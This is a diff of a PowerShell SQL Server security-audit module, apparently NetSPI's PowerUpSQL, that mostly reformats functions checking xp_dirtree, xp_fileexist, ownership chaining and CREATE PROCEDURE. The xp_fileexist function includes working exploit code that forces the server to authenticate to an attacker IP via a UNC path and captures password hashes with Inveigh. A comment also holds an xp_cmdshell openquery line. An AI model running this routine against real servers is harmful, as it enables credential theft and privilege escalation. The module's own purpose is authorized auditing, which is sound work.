+                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
             }
         }
         else
         {
             Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_dirtree."
-        }                       
-                   
+        }
+
         # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - XP_DIRTREE" 
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - XP_DIRTREE"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -10386,56 +10401,56 @@ Function Invoke-SQLAuditPrivXpFileexist
 {
     <#
             .SYNOPSIS
-            Check if the current user has privileges to execute xp_fileexist extended stored procedure.  
-            If exploit option is used, the script will inject a UNC path to the attacker's IP and capture 
+            Check if the current user has privileges to execute xp_fileexist extended stored procedure.
+            If exploit option is used, the script will inject a UNC path to the attacker's IP and capture
             the SQL Server service account password hash using Inveigh.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
             .PARAMETER Exploit
-            Exploit vulnerable issues.  
+            Exploit vulnerable issues.
             .PARAMETER AttackerIp
-            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.      
+            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.
             .PARAMETER TimeOut
-            Number of seconds to wait for authentication from target SQL Server.                          
+            Number of seconds to wait for authentication from target SQL Server.
             .EXAMPLE
             PS C:\> Invoke-SQLAuditPrivXpFileexist -Verbose -Instance SQLServer1\STANDARDDEV2014 -AttackerIp 10.1.1.2
 
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditPrivXpFileexist -Verbose 
+            PS C:\> Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditPrivXpFileexist -Verbose
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [string]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit,
@@ -10450,9 +10465,9 @@ Function Invoke-SQLAuditPrivXpFileexist
     )
 
     Begin
-    {                 
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -10463,15 +10478,15 @@ Function Invoke-SQLAuditPrivXpFileexist
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_fileexist" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_fileexist"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -10481,7 +10496,7 @@ Function Invoke-SQLAuditPrivXpFileexist
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED."
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist."           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist."
             Return
         }
         else
@@ -10491,20 +10506,20 @@ Function Invoke-SQLAuditPrivXpFileexist
 
         # Grab server information
         # Grab server, login, and role information
-        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose 
-        $ComputerName = $ServerInfo.ComputerName                
-        $CurrentLogin = $ServerInfo.CurrentLogin        
-        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose              
+        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+        $ComputerName = $ServerInfo.ComputerName
+        $CurrentLogin = $ServerInfo.CurrentLogin
+        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
         $CurrentPrincpalList = @()
-        $CurrentPrincpalList += $CurrentLogin       
+        $CurrentPrincpalList += $CurrentLogin
         $CurrentPrincpalList += 'Public'
         $CurrentLoginRoles | ForEach-Object -Process {
             $CurrentPrincpalList += $_.RolePrincipalName
-        }   
+        }
 
-        # --------------------------------------------     
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -10512,23 +10527,23 @@ Function Invoke-SQLAuditPrivXpFileexist
         else
         {
             $TestMode  = 'Audit'
-        }         
+        }
         $Vulnerability = 'Excessive Privilege - Execute xp_fileexist'
         $Description   = 'xp_fileexist is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.'
         $Remediation   = 'Remove EXECUTE privileges on the xp_fileexist procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_fileexist to Public'
-        $Severity      = 'Medium' 
+        $Severity      = 'Medium'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         $ExploitCmd    = 'Crack the password hash offline or relay it to another system.'
-        $Details       = ''   
-        $Reference     = 'https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/'       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016' 
-        
-        # -----------------------------------------------------------------     
+        $Details       = ''
+        $Reference     = 'https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/'
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------     
+        # -----------------------------------------------------------------
 
         # Get users and roles that execute xp_fileexist
         $DirTreePrivs = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName master -SuppressVerbose | Where-Object -FilterScript {
@@ -10539,47 +10554,56 @@ Function Invoke-SQLAuditPrivXpFileexist
         if($DirTreePrivs)
         {
             # Status user
-            Write-Verbose -Message "$Instance : - The $PrincipalName principal has EXECUTE privileges on xp_fileexist."  
+            Write-Verbose -Message "$Instance : - The $PrincipalName principal has EXECUTE privileges on xp_fileexist."
 
-            $IsVulnerable  = 'Yes'             
-            $DirTreePrivs | 
-            ForEach-Object -Process {                
-                $PrincipalName = $DirTreePrivs.PrincipalName                
-        
+            $IsVulnerable  = 'Yes'
+            $DirTreePrivs |
+            ForEach-Object -Process {
+                $PrincipalName = $DirTreePrivs.PrincipalName
+
                 # Check if current login can exploit
                 $CurrentPrincpalList |
-                ForEach-Object -Process { 
+                ForEach-Object -Process {
                     $PrincipalCheck = $_
 
                     if($PrincipalName -eq $PrincipalCheck)
                     {
-                        $IsExploitable  = 'Yes' 
+                        $IsExploitable  = 'Yes'
 
                         # Check if the current process has elevated privs
                         # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
-                        $CurrentIdentity=[System.Security.Principal.WindowsIdentity]::GetCurrent()
-                        $prp=new-object System.Security.Principal.WindowsPrincipal($CurrentIdentity)
-                        $adm=[System.Security.Principal.WindowsBuiltInRole]::Administrator
-                        $IsAdmin=$prp.IsInRole($adm)
+                        $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                        $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
+                        $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
+                        $IsAdmin = $prp.IsInRole($adm)
                         if (-not $IsAdmin)
-                         {
-                            Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."Â
+                        {
+                            Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."
                             $IAMADMIN = 'No'
-                         }else{
+                        }
+                        else
+                        {
                             Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded."
                             $IAMADMIN = 'Yes'
-                         }
+                        }
 
                         # Get IP of current system
                         if(-not $AttackerIp)
                         {
                             $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
-                            Select-Object -ExpandProperty Ipv4Address |
+                                Select-Object -ExpandProperty Ipv4Address |
                             Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)
 
-                            if($AttackerIp -eq "127.0.0.1"){
-                                $AttackerIp = Get-WmiObject win32_networkadapterconfiguration -filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME | 
-                                Select-Object -First 1 @{Name = "IPAddress";Expression = {[regex]$rx = "(\d{1,3}(\.?)){4}"; $rx.matches($_.IPAddress)[0].Value}} | Select-Object IPaddress -ExpandProperty IPAddress -First 1
+                            if($AttackerIp -eq '127.0.0.1')
+                            {
+                                $AttackerIp = Get-WmiObject -Class win32_networkadapterconfiguration -Filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME |
+                                Select-Object -First 1 -Property @{
+                                    Name       = 'IPAddress'
+                                    Expression = {
+                                        [regex]$rx = '(\d{1,3}(\.?)){4}'; $rx.matches($_.IPAddress)[0].Value
+                                    }
+                                } |
+                                Select-Object -Property IPaddress -ExpandProperty IPAddress -First 1
                             }
                         }
 
@@ -10587,7 +10611,7 @@ Function Invoke-SQLAuditPrivXpFileexist
                         if($IAMADMIN -eq 'Yes')
                         {
                             # Attempt to load Inveigh from file
-                            #$InveighSrc = Get-Content .\scripts\Inveigh.ps1 -ErrorAction SilentlyContinue 
+                            #$InveighSrc = Get-Content .\scripts\Inveigh.ps1 -ErrorAction SilentlyContinue
                             #Invoke-Expression($InveighSrc)
 
                             # Attempt to load Inveigh via reflection
@@ -10596,28 +10620,28 @@ Function Invoke-SQLAuditPrivXpFileexist
                             $TestIt = Test-Path -Path Function:\Invoke-Inveigh
                             if($TestIt -eq 'True')
                             {
-                                Write-Verbose -Message "$Instance : - Inveigh loaded." 
+                                Write-Verbose -Message "$Instance : - Inveigh loaded."
 
                                 # Get IP of SQL Server instance
-                                $InstanceIP = Resolve-DnsName $ComputerName | Select-Object -Property IPaddress -ExpandProperty ipaddress 
-                                
+                                $InstanceIP = Resolve-DnsName $ComputerName | Select-Object -Property IPaddress -ExpandProperty ipaddress
+
                                 # Start sniffing for hashes from that IP
-                                Write-Verbose -Message "$Instance : - Start sniffing..." 
-                                Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp | Out-Null
+                                Write-Verbose -Message "$Instance : - Start sniffing..."
+                                $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp
 
                                 # Sent unc path to attacker's Ip
                                 Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\path..."
-                                Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\file'" -TimeOut 10 -SuppressVerbose | Out-Null                               
-                                
+                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\file'" -TimeOut 10 -SuppressVerbose
+
                                 # Stop sniffing and print password hashes
                                 Start-Sleep $TimeOut
-                                Stop-Inveigh | Out-Null
-                                Write-Verbose -Message "$Instance : - Stopped sniffing." 
-                                
+                                $null = Stop-Inveigh
+                                Write-Verbose -Message "$Instance : - Stopped sniffing."
+
                                 $HashType = ''
                                 $Hash = ''
 
-                                [string]$PassCleartext = Get-InveighCleartext 
+                                [string]$PassCleartext = Get-InveighCleartext
                                 if($PassCleartext)
                                 {
                                     $HashType = 'Cleartext'
@@ -10636,73 +10660,73 @@ Function Invoke-SQLAuditPrivXpFileexist
                                 {
                                     $HashType = 'NetNTLMv2'
                                     $Hash = $PassNetNTLMv2
-                                }                                                                       
-                                
+                                }
+
                                 if($Hash)
                                 {
-                                    # Update Status    
-                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:" 
+                                    # Update Status
+                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:"
                                     Write-Verbose -Message "$Instance : - $Hash"
                                     $Exploited = 'Yes'
-                                    $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash" 
+                                    $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash"
                                 }
                                 else
                                 {
-                                    # Update Status    
+                                    # Update Status
                                     $Exploited = 'No'
-                                    $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database.  xp_fileexist Executed, but no password hash was recovered."   
-                                }        
-                                
+                                    $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database.  xp_fileexist Executed, but no password hash was recovered."
+                                }
+
                                 # Clear inveigh cache
-                                $null = Clear-Inveigh                                          
+                                $null = Clear-Inveigh
                             }
                             else
                             {
-                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded." 
+                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded."
                                 # Update status
                                 $Exploited = 'No'
-                                $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered." 
+                                $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered."
                             }
                         }
                         else
                         {
                             # Update status
                             $Exploited = 'No'
-                            $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database."                            
+                            $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database."
                         }
                     }
                     else
                     {
                         # Update status
-                        $IsExploitable  = 'No' 
-                        $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database."  
+                        $IsExploitable  = 'No'
+                        $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database."
                     }
                 }
 
-                # Add record                              
-                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                                       
+                # Add record
+                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
+            }
+        
+            else
+            {
+                Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_fileexist."
+            }
+
+            # Status User
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist"
+        }
+
+        End
+        {
+            # Return data
+            if ( -not $NoOutput)
+            {
+                Return $TblData
             }
         }
-        else
-        {
-            Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_fileexist."
-        }                       
-                   
-        # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist" 
-    }
 
-    End
-    {   
-        # Return data  
-        if ( -not $NoOutput)
-        {
-            Return $TblData
-        }
     }
 }
-
-
 # ---------------------------------------
 # Invoke-SQLAuditPrivDbChaining
 # ---------------------------------------
@@ -10713,11 +10737,11 @@ Function Invoke-SQLAuditPrivDbChaining
             .SYNOPSIS
             Check if data ownership chaining is enabled at the server or databases levels.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
             SQL Server instance to connection to.
             .PARAMETER NoDefaults
@@ -10725,15 +10749,15 @@ Function Invoke-SQLAuditPrivDbChaining
             .PARAMETER NoOutput
             Don't return output.
             .PARAMETER Exploit
-            Exploit vulnerable issues.         
+            Exploit vulnerable issues.
             .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivDbChaining -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Invoke-SQLAuditPrivDbChaining -Instance SQLServer1\STANDARDDEV2014
 
             ComputerName  : NETSPI-283-SSU
             Instance      : NETSPI-283-SSU\STANDARDDEV2014
             Vulnerability : Excessive Privilege - Database Ownership Chaining
             Description   : Ownership chaining was found enabled at the server or database level.  Enabling ownership chaining can lead to unauthorized access to database resources.
-            Remediation   : Configured the affected database so the 'is_db_chaining_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING ON' is used 
+            Remediation   : Configured the affected database so the 'is_db_chaining_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING ON' is used
             enable chaining.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING OFF;' can be used to disable chaining.
             Severity      : Low
             IsVulnerable  : Yes
@@ -10741,33 +10765,33 @@ Function Invoke-SQLAuditPrivDbChaining
             Exploited     : No
             ExploitCmd    : There is not exploit available at this time.
             Details       : The database testdb was found configured with ownership chaining enabled.
-            Reference     : https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx 
+            Reference     : https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx
             Author        : Scott Sutherland (@_nullbind), NetSPI 2016
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivDbChaining -Verbose 
+            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivDbChaining -Verbose
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Only select non default databases.')]
@@ -10776,16 +10800,16 @@ Function Invoke-SQLAuditPrivDbChaining
         [Parameter(Mandatory = $false,
         HelpMessage = "Don't output anything.")]
         [switch]$NoOutput,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Exploit vulnerable issues.')]
         [switch]$Exploit
     )
 
     Begin
-    {                 
+    {
         # Table for output
-        $TblData = New-Object -TypeName System.Data.DataTable 
+        $TblData = New-Object -TypeName System.Data.DataTable
         $null = $TblData.Columns.Add('ComputerName')
         $null = $TblData.Columns.Add('Instance')
         $null = $TblData.Columns.Add('Vulnerability')
@@ -10796,15 +10820,15 @@ Function Invoke-SQLAuditPrivDbChaining
         $null = $TblData.Columns.Add('IsExploitable')
         $null = $TblData.Columns.Add('Exploited')
         $null = $TblData.Columns.Add('ExploitCmd')
-        $null = $TblData.Columns.Add('Details')    
-        $null = $TblData.Columns.Add('Reference')   
-        $null = $TblData.Columns.Add('Author')   
+        $null = $TblData.Columns.Add('Details')
+        $null = $TblData.Columns.Add('Reference')
+        $null = $TblData.Columns.Add('Author')
     }
 
     Process
-    {   
+    {
         # Status User
-        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining" 
+        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"
 
         # Test connection to server
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
@@ -10814,7 +10838,7 @@ Function Invoke-SQLAuditPrivDbChaining
         {
             # Status user
             Write-Verbose -Message "$Instance : CONNECTION FAILED."
-            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining."           
+            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining."
             Return
         }
         else
@@ -10827,9 +10851,9 @@ Function Invoke-SQLAuditPrivDbChaining
         $CurrentLogin = $ServerInfo.CurrentLogin
         $ComputerName = $ServerInfo.ComputerName
 
-        # --------------------------------------------     
+        # --------------------------------------------
         # Set function meta data for report output
-        # --------------------------------------------  
+        # --------------------------------------------
         if($Exploit)
         {
             $TestMode  = 'Exploit'
@@ -10837,26 +10861,26 @@ Function Invoke-SQLAuditPrivDbChaining
         else
         {
             $TestMode  = 'Audit'
-        }         
+        }
         $Vulnerability = 'Excessive Privilege - Database Ownership Chaining'
         $Description   = 'Ownership chaining was found enabled at the server or database level.  Enabling ownership chaining can lead to unauthorized access to database resources.'
         $Remediation   = "Configured the affected database so the 'is_db_chaining_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING ON' is used enable chaining.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING OFF;' can be used to disable chaining."
-        $Severity      = 'Low' 
+        $Severity      = 'Low'
         $IsVulnerable  = 'No'
-        $IsExploitable = 'No' 
+        $IsExploitable = 'No'
         $Exploited     = 'No'
         $ExploitCmd    = 'There is not exploit available at this time.'
-        $Details       = ''   
-        $Reference     = 'https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx '       
-        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016' 
-        
-        # -----------------------------------------------------------------     
+        $Details       = ''
+        $Reference     = 'https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx '
+        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'
+
+        # -----------------------------------------------------------------
         # Check for the Vulnerability
         # Note: Typically a missing patch or weak configuration
-        # -----------------------------------------------------------------     
+        # -----------------------------------------------------------------
 
         # Select links configured with static credentials
-        
+
         if($NoDefaults)
         {
             $ChainDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -NoDefaults -SuppressVerbose | Where-Object -FilterScript {
@@ -10873,14 +10897,14 @@ Function Invoke-SQLAuditPrivDbChaining
         # Update vulnerable status
         if($ChainDatabases)
         {
-            $IsVulnerable  = 'Yes'             
-            $ChainDatabases | 
-            ForEach-Object -Process {                
-                $DatabaseName = $_.DatabaseName                
-        
+            $IsVulnerable  = 'Yes'
+            $ChainDatabases |
+            ForEach-Object -Process {
+                $DatabaseName = $_.DatabaseName
+
                 Write-Verbose -Message "$Instance : - The database $DatabaseName was found configured as trustworthy."
                 $Details = "The database $DatabaseName was found configured with ownership chaining enabled."
-                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                                       
+                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
             }
         }
         else
@@ -10894,36 +10918,36 @@ Function Invoke-SQLAuditPrivDbChaining
         }
         if($ServerCheck)
         {
-            $IsVulnerable  = 'Yes' 
+            $IsVulnerable  = 'Yes'
             Write-Verbose -Message "$Instance : - The server configuration 'cross db ownership chaining' is set to 1.  This can affect all databases."
             $Details = "The server configuration 'cross db ownership chaining' is set to 1.  This can affect all databases."
-            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)                                                                                       
+            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
         }
 
-        # -----------------------------------------------------------------     
-        # Check for exploit dependancies 
+        # -----------------------------------------------------------------
+        # Check for exploit dependancies
         # Note: Typically secondary configs required for dba/os execution
         # -----------------------------------------------------------------
         # $IsExploitable = "No" or $IsExploitable = "Yes"
         # Check if the link is alive and verify connection + check if sysadmin
 
 
-        # -----------------------------------------------------------------    
+        # -----------------------------------------------------------------
         # Exploit Vulnerability
         # Note: Add the current user to sysadmin fixed server role
-        # -----------------------------------------------------------------        
-        # $Exploited = "No" or $Exploited     = "Yes" 
+        # -----------------------------------------------------------------
+        # $Exploited = "No" or $Exploited     = "Yes"
         # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
         # Also, recommend link crawler module
-                       
-                   
+
+
         # Status User
-        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining" 
+        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"
     }
 
     End
-    {   
-        # Return data  
+    {
+        # Return data
         if ( -not $NoOutput)
         {
             Return $TblData
@@ -10936,19 +10960,19 @@ Function Invoke-SQLAuditPrivDbChaining
 # Invoke-SQLAuditPrivCreateProcedure
 # ---------------------------------------
 # Author: Scott Sutherland
-Function Invoke-SQLAuditPrivCreateProcedure 
+Function Invoke-SQLAuditPrivCreateProcedure
 {
     <#
             .SYNOPSIS
             Check if the current login has the CREATE PROCEDURE permission.  Attempt to leverage to obtain sysadmin privileges.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER NoOutput
             Don't output anything.
             .PARAMETER Exploit
@@ -10960,7 +10984,7 @@ Function Invoke-SQLAuditPrivCreateProcedure
             Instance      : SQLServer1\STANDARDDEV2014
             Vulnerability : PERMISSION - CREATE PROCEDURE
             Description   : The login has privileges to create stored procedures in one or more databases.  This may allow the login to escalate privileges within the database.
-            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a 
+            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a
             command like: REVOKE CREATE PROCEDURE TO user.
             Severity      : Medium
             IsVulnerable  : Yes
@@ -10974,39 +10998,39 @@ Function Invoke-SQLAuditPrivCreateProcedure
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
